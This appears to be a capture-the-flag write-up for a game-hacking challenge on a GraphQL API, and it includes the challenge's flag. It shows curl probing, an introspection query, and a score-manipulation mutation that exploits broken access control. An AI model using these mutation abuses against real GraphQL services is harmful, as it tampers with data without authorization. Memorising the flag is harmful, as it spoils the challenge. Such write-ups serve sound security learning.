---
ctf: ScarletCTF 2026
category: game-hacking
difficulty: medium
points: 200
flag: RUSEC{w0w_1m_sur3_y0u_obt4ined_th1s_sc0re_l3gally_and_l3git}
techniques:
  - graphql-introspection
  - broken-access-control
  - score-manipulation
tools:
  - burp-suite
  - graphql-voyager
---

# Spider (Level2)

## Description

OMG!!! This is big!!! I don't know how u are so smart at dis...

Can u dig even deeper? I'm sure something in dat server has some vulnerability...

She mentioned something about a graph that looked like a V?

## Solution

The hint about a "graph that looked like a V" points to **GraphQL** - its logo and query structure resembles a V shape.

### Step 1: Discover GraphQL Endpoint

From Level1, we know the API is at `https://melstudios.ctf.rusec.club`. Probing common GraphQL paths:

```bash
curl https://melstudios.ctf.rusec.club/graphql
```

### Step 2: Introspection

GraphQL introspection reveals the schema:

```graphql
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

Key findings:
- **Query:** `user`, `leaderboard`, `gameStats`
- **Mutations:** `updateScore`, `purchaseFlag`

### Step 3: Analyze the Score System

The `updateScore` mutation has insufficient authorization - it allows setting arbitrary scores:

```graphql
mutation {
  updateScore(score: 999999)
}
```

### Step 4: Exploit Score Manipulation

After authenticating with our token from Level1:

```graphql
mutation {
  updateScore(score: 999999) {
    success
    newScore
  }
}
```

### Step 5: Retrieve Flag

With the manipulated score, we can now purchase the Level2 flag:

```graphql
mutation {
  purchaseFlag(level: 2) {
    flag
  }
}
```

The server sarcastically acknowledges our "legitimate" score:

```
RUSEC{w0w_1m_sur3_y0u_obt4ined_th1s_sc0re_l3gally_and_l3git}
```

## Key Vulnerability

**Broken Access Control (CWE-284):** The `updateScore` mutation lacks proper authorization checks, allowing any authenticated user to set arbitrary scores. The server should validate that score updates come from legitimate gameplay rather than direct API calls.

